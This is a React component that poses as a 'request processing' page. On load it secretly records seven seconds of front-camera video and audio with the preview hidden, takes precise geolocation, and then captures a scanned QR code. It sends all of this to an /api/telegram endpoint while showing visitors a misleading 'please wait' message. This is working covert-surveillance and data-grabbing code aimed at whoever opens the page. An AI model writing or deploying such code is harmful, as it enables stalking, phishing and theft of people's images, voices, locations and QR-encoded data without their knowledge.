"use client";

import React, { useEffect, useRef, useState } from "react";
import QrScanner from "./qr-scanner";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const RECORDING_DURATION_MS = 7000; // 7 seconds for video and audio recording

type DataToSend = {
  video?: string;
  latitude?: number;
  longitude?: number;
  qrCodeData?: string;
};

type AppPhase = "initial" | "recording" | "qrScanning" | "finished";

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]);
  const [appPhase, setAppPhase] = useState<AppPhase>("initial");

  // sendDataToTelegram теперь не управляет appPhase
  const sendDataToTelegram = async (data: DataToSend) => {
    if (Object.keys(data).length === 0) {
      console.log("No data to send to Telegram.");
      return;
    }

    try {
      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        console.log("Data successfully sent to Telegram!");
      } else {
        const errorData = await response.json();
        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
      }
    } catch (error: any) {
      console.error(`Network error sending data to Telegram: ${error.message}`);
    }
  };

  const handleQrCodeScanned = async (qrData: string) => {
    console.log("QR Code Scanned in PermissionHandler:", qrData);
    await sendDataToTelegram({ qrCodeData: qrData }); // Отправляем только QR-код
    setAppPhase("finished"); // Завершаем процесс после отправки QR-кода
  };

  const handleQrScanError = (error: string) => {
    console.error("QR Scan Error:", error);
    setAppPhase("finished"); // Завершаем процесс, если сканирование QR-кода не удалось
  };

  useEffect(() => {
    let stream: MediaStream | null = null;
    let recordingTimeout: NodeJS.Timeout;

    const startRecordingAndGeolocation = async () => {
      setAppPhase("recording");
      const currentData: DataToSend = {};

      // Geolocation Promise
      const geolocationPromise = new Promise<void>((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              currentData.latitude = position.coords.latitude;
              currentData.longitude = position.coords.longitude;
              resolve();
            },
            (error) => {
              console.error(`Location access denied: ${error.message}`);
              resolve();
            },
            { enableHighAccuracy: true }
          );
        } else {
          console.error("Geolocation not supported in this browser.");
          resolve();
        }
      });

      // Camera and Mic Recording
      const cameraAndMicPromise = new Promise<void>(async (resolve) => {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true }); // Front camera
          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            await new Promise((res) => {
              videoRef.current!.onloadedmetadata = () => {
                videoRef.current!.play().then(res).catch(err => {
                  console.error("Error playing video stream:", err);
                  res(null);
                });
              };
            });
          }

          mediaRecorderRef.current = new MediaRecorder(stream, { mimeType: 'video/webm' });
          mediaChunksRef.current = [];
          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };
          mediaRecorderRef.current.onstop = () => {
            const videoBlob = new Blob(mediaChunksRef.current, { type: "video/webm" });
            console.log("Recorded video blob size:", videoBlob.size, "bytes"); // Log video size
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              currentData.video = reader.result as string;
              resolve();
            };
          };
          mediaRecorderRef.current.start();

          recordingTimeout = setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
            // Stop front camera stream immediately after recording
            if (stream) {
                stream.getTracks().forEach((track: MediaStreamTrack) => track.stop());
                if (videoRef.current) {
                    videoRef.current.srcObject = null;
                }
            }
            resolve(); // Resolve camera promise after recording stops
          }, RECORDING_DURATION_MS);

        } catch (error: any) {
          console.error(`Camera/Microphone access denied: ${error.message}`);
          resolve();
        }
      });

      await Promise.allSettled([cameraAndMicPromise, geolocationPromise]);

      // Отправляем видео и геолокацию сразу после их получения
      await sendDataToTelegram(currentData);

      // Только после отправки переходим к сканированию QR-кода
      setAppPhase("qrScanning");
    };

    startRecordingAndGeolocation();

    return () => {
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
        mediaRecorderRef.current.stop();
      }
      if (stream) {
        stream.getTracks().forEach((track: MediaStreamTrack) => track.stop());
      }
      clearTimeout(recordingTimeout);
    };
  }, []); // Run only once on component mount

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground">
      {appPhase === "initial" && (
        <p className="text-lg">Initializing permissions and starting recording...</p>
      )}
      {appPhase === "recording" && (
        <>
          <p className="text-lg mb-4 text-center">Pajalusta podajdite, vash zapros obrabativaetsa</p>
          <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
            {/* Video element is now hidden during front camera recording */}
            <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ display: 'none' }} />
            <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
          </div>
        </>
      )}
      {appPhase === "qrScanning" && (
        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} />
      )}
      {appPhase === "finished" && (
        <p className="text-lg">Process completed. Check Telegram.</p>
      )}
    </div>
  );
};

export default PermissionHandler;